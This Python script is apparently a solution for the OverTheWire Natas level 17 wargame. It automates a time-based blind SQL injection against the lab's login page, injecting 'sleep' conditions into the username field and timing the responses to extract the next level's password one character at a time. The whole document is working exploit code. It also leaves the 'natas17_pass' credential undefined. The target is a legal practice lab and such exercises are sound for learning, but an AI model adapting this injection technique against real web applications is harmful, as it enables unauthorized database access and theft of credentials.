#!/usr/bin/env python3
import requests
from urllib.parse import urlencode


url = 'http://natas17.natas.labs.overthewire.org/index.php?'
auth = ('natas17', natas17_pass)

def get_charset(sleep=1):
    alnum = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
    charset = ''
    for char in alnum:
        sqli = ('natas18" and '
               f'password like binary "%{char}%" and '
               f'sleep({sleep})#')
        payload = urlencode({'username': sqli})
        r = requests.get(url+payload, auth=auth)
        if r.elapsed.total_seconds() >= sleep:
            charset += char
    return charset

def get_password(charset, sleep=1):
    password = ''
    while True:
        for char in charset:
            sqli = ('natas18" and '
                   f'password like binary "{password+char}%" and '
                   f'sleep({sleep})#')
            payload = urlencode({'username': sqli})
            r = requests.get(url+payload, auth=auth)
            if r.elapsed.total_seconds() >= sleep:
                password += char
                break
        else:
            break
    return password


if __name__ == '__main__':
    time = 1
    charset = get_charset(time)
    password = get_password(charset, time)
    print(password)
